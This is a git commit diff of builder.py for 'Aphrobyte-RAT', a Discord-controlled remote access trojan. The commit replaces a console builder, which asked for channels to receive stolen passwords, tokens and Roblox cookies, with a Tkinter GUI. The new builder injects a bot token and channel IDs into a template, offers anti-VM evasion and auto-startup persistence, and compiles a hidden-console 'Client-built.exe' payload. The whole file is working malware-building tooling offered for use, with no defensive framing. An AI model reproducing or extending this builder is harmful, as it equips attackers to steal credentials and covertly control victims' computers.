29ebe49cff671293dde3d3089d7ce0f9cb316f5e
RIOT Administration <71534600+Riot-Byte@users.noreply.github.com>
2023-08-22 17:59:49 +0300

    ui builder

--- builder.py
+++ builder.py
@@ -1,132 +1,158 @@
-import sys, os, shutil
-try:
-    from termcolor import colored
-    import colorama
-    from colorama import Fore
-    from pystyle import Colors, Colorate, Center
-except:
-    os.system("pip install termcolor")
-    os.system("pip install colorama")
-    os.system("pip install pystyle")
-    from termcolor import colored
-    import colorama
-    from colorama import Fore
-    from pystyle import Colors, Colorate, Center
+import tkinter as tk, os, shutil
+from time import sleep
+from tkinter import ttk
+try: 
+    from PIL import Image, ImageTk
+except: 
+    os.system("pip install Pillow")
+    os.system("python builder.py")
 
-colorama.init()
+buildstarted = False
 
-####################################################
+def build_bot(anti_vm_variable, autostartup_variable):
+    global buildstarted
+    if buildstarted != True:
 
-samplefile = ".buildmodules\sample.py"
+        bot_token = textbox1.get()
+        guild_id = textbox2.get()
+        alerts_id = textbox3.get()
 
-class Builder:
-    def __init__(self,token,guild_id,announc,passw,tokens,roblosec):
-        self.token = token
-        self.guild_id = guild_id
-        self.announc = announc
-        self.passw = passw
-        self.tokens = tokens
-        self.roblosec = roblosec
+        if bot_token and guild_id and alerts_id != "":
+            pass
+        else:
+            return
 
-        f = open(".buildmodules\main.py", 'r')
-        file = f.read()
-        f.close()
+        buildstarted = True
+        build_button.config(text="BUILDING")
 
-        newfile = file.replace("{token}", self.token)
-        newfile = newfile.replace("{guild_id}", self.guild_id)
-        newfile = newfile.replace("{announc}", self.announc)
-        newfile = newfile.replace("{passw}", self.passw)
-        newfile = newfile.replace("{tokens}", self.tokens)
-        newfile = newfile.replace("{roblosec}", self.roblosec)
+        if str(anti_vm_variable) == "PY_VAR0":
+            anti_vm_variable = False
+        elif str(anti_vm_variable) == "PY_VAR1":
+            anti_vm_variable = True
+        
+        if str(autostartup_variable) == "PY_VAR0":
+            autostartup_variable = False
+        elif str(autostartup_variable) == "PY_VAR1":
+            autostartup_variable = True
 
-        f = open(".buildmodules\main.py", 'w')
-        f.write(newfile)
-        f.close()
-    def build(self):
-        os.system("""
-python -m PyInstaller --onefile --noconsole --name="Client-built" --icon=".buildmodules\exeic.ico" ".buildmodules\main.py"
-""")
+        if os.path.exists(".buildmodules\\main.py"):
+            os.remove(".buildmodules\\main.py")
+        
+#token = "{token}"
+#guild_id = "{guild_id}"
+#autostart = "{autostart}"
+#antivm = "{antivm}"
+#annc_channel_id = "{announcements}"
 
+        newfile = shutil.copy(".buildmodules\\sample.py", ".buildmodules\\main.py")
+        with open(newfile, "r") as f:
+            content = f.read()
 
-####################################################
+        newcontent = content.replace("{token}", bot_token)
+        newcontent = newcontent.replace("{guild_id}", guild_id)
+        newcontent = newcontent.replace("{announcements}", alerts_id)
+        newcontent = newcontent.replace('"{antivm}"', str(anti_vm_variable))
+        newcontent = newcontent.replace('"{autostart}"', str(autostartup_variable))
 
+        with open(newfile, "w+") as f:
+            f.write(newcontent)
 
-def pause():
-    os.system("pause")  
-def clear():
-    os.system("cls")    
+        sleep(1)
 
-def printart():
-    ascii_art = """
+        os.system('PyInstaller --onefile --noconsole --icon=".buildmodules\\exeic.ico" --name="Client-built" .buildmodules\\main.py')
 
-░█████╗░██████╗░██╗░░██╗██████╗░░█████╗░██████╗░██╗░░░██╗████████╗███████╗
-██╔══██╗██╔══██╗██║░░██║██╔══██╗██╔══██╗██╔══██╗╚██╗░██╔╝╚══██╔══╝██╔════╝
-███████║██████╔╝███████║██████╔╝██║░░██║██████╦╝░╚████╔╝░░░░██║░░░█████╗░░
-██╔══██║██╔═══╝░██╔══██║██╔══██╗██║░░██║██╔══██╗░░╚██╔╝░░░░░██║░░░██╔══╝░░
-██║░░██║██║░░░░░██║░░██║██║░░██║╚█████╔╝██████╦╝░░░██║░░░░░░██║░░░███████╗
-╚═╝░░╚═╝╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═════╝░░░░╚═╝░░░░░░╚═╝░░░╚══════╝
-""" 
+        if os.path.exists("build"):
+            shutil.rmtree("build")
+        if os.path.exists("dist"):
+            shutil.copy("dist\\Client-built.exe", "Client-built.exe")
+            shutil.rmtree("dist")
+        if os.path.exists("Client-built.spec"):
+            os.remove("Client-built.spec")
+        
+        build_button.config(text="BUILD")
+        
+        buildstarted = False
+    else:
+        buildstarted = False
+        if os.path.exists("build"):
+            shutil.rmtree("build")
+        if os.path.exists("dist"):
+            shutil.rmtree("dist")
+        if os.path.exists("Client-built.spec"):
+            os.remove("Client-built.spec")
+        build_button.configure(text="BUILD")
 
-    creds = """
-    ╔═══════════════════════════════════════╗
-    ╬ Created by RIOT Administration        ╬
-    ╬ Invite: https://discord.gg/4TyqkDXtBa ╬
-    ╚═══════════════════════════════════════╝
-    """
+def installreq():
+    installreq_button.config(text="INSTALLING REQUIREMENTS")
+    os.system("pip install -r .buildmodules\\requirements.txt")
+    installreq_button.config(text="INSTALL REQUIREMENTS")
 
-    print(Colorate.Vertical(Colors.purple_to_blue, Center.XCenter(ascii_art)))
-    print(Colorate.Vertical(Colors.blue_to_purple, Center.XCenter(creds)))
+root = tk.Tk()
+root.title("Aphrobyte @ RIOT Administration")
+root.geometry("400x470")
+root.configure(background="#333")
 
+root.update_idletasks()
+screen_width = root.winfo_screenwidth()
+screen_height = root.winfo_screenheight()
+x = (screen_width - root.winfo_width()) // 2
+y = (screen_height - root.winfo_height()) // 2
+root.geometry(f"+{x}+{y}")
 
-clear()
-os.system("""title "Aphrobyte-RAT Builder | Warning | Unlicensed"
-""")
-print(colored("""WARNING: Enable Developer Mode on Discord first. Look on YouTube if you don't know something.""", 'red'))
-print(colored("""WARNING: Your Discord bot should have all privileged gateway intents enabled. If you don't know how to enable them, look on YouTube.""", 'red'))   
-pause()
-clear()
-os.system("""title "Aphrobyte-RAT Builder | Configuration | Unlicensed"
-""")
-printart()
-print("")   
-token = input("Bot token : ")
-guildid = input("Server ID : ")
-annc = input("Notification channel ID : ")
-passw = input("Passwords channel ID to receive passwords : ")
-tokens = input("Tokens channel ID to receive tokens : ")
-roblosecurity = input("Roblosecurity channel ID to receive Roblox cookies : ")  
-print("")
-clear()
-print(f"""
-{Fore.BLUE}Bot token : {token}
-{Fore.BLUE}Guild ID : {guildid}
-{Fore.BLUE}Notifications channel ID : {annc}
-{Fore.BLUE}Passwords channel ID : {passw}
-{Fore.BLUE}Tokens channel ID : {tokens}
-{Fore.BLUE}Roblosecurity channel ID : {roblosecurity}
+style = ttk.Style()
+style.configure("TFrame", background="#333")
+style.configure("TLabel", background="#333", foreground="white")
+style.configure("TButton", background="#333", foreground="black", padding=(10, 5))
+style.configure("TCheckbutton", background="#333", foreground="white")
 
-""")
-prompt = input(f"{Fore.BLUE}Is this correct? (y/n)")
-if prompt.lower() == "y":
-    pass
-elif prompt.lower() == "n":
-    exit()
-os.system("""title "Aphrobyte-RAT Builder | Compiling | Unlicensed"
-""")
-clear()
-print(colored("Started compiling Aphrobyte-RAT configuration...", 'green'))
-shutil.copy(samplefile, ".buildmodules\main.py")
-builder = Builder(token=token,guild_id=guildid,announc=annc,passw=passw,tokens=tokens,roblosec=roblosecurity)
-builder.build()
-print("")
-print(colored("""
-Your payload has been successfully created. It has been named to "Client-built.exe" and can be used as a standalone.
-""", 'green'))
-shutil.copy("dist\\Client-built.exe", "Client-built.exe")
-os.remove(".buildmodules\main.py")
-shutil.rmtree("dist")
-shutil.rmtree("build")
-os.remove("Client-built.spec")
-os.system("""title "Aphrobyte-RAT Builder | Built | Unlicensed"
-""")
-pause()
+logo_image = Image.open("builderassets\\logo.png")
+logo_image = logo_image.resize((100, 100))
+logo_photo = ImageTk.PhotoImage(logo_image)
+logo_label = tk.Label(root, image=logo_photo, bg="#333")
+logo_label.image = logo_photo
+logo_label.pack(pady=20)
+
+input_frame = ttk.Frame(root, style="TFrame")
+input_frame.pack(pady=10)
+
+# bot token
+label1 = ttk.Label(input_frame, text="Bot Token:")
+label1.grid(row=0, column=0, padx=10, sticky="e")
+textbox1 = tk.Entry(input_frame, bg="white")
+textbox1.grid(row=0, column=1, padx=10, pady=10, sticky="w")
+
+# guild id
+label2 = ttk.Label(input_frame, text="Guild ID:")
+label2.grid(row=1, column=0, padx=10, sticky="e")
+textbox2 = tk.Entry(input_frame, bg="white")
+textbox2.grid(row=1, column=1, padx=10, pady=10, sticky="w")
+
+# alerts channel
+label3 = ttk.Label(input_frame, text="Alerts channel ID:")
+label3.grid(row=2, column=0, padx=10, sticky="e")
+textbox3 = tk.Entry(input_frame, bg="white")
+textbox3.grid(row=2, column=1, padx=10, pady=10, sticky="w")
+
+checkbox_frame = ttk.Frame(root, style="TFrame")
+checkbox_frame.pack(pady=10)
+
+# anti vm checkbox
+anti_vm_variable = tk.BooleanVar()
+anti_vm = ttk.Checkbutton(checkbox_frame, text="Anti VM", variable=anti_vm_variable)
+anti_vm.pack(side="left", padx=10)
+
+# auto startup checkbox
+autostartup_variable = tk.BooleanVar()
+auto_startup = ttk.Checkbutton(checkbox_frame, text="Auto Startup", variable=autostartup_variable)
+auto_startup.pack(side="left", padx=10)
+
+# build button
+build_button = ttk.Button(root, text="BUILD", command=lambda: build_bot(anti_vm_variable, autostartup_variable))
+build_button.pack(pady=20)
+
+# install requirements button
+installreq_button = ttk.Button(root, text="INSTALL REQUIREMENTS", command=installreq)
+installreq_button.pack(pady=21)
+
+root.iconbitmap("builderassets\\bitmap.ico")
+root.mainloop()
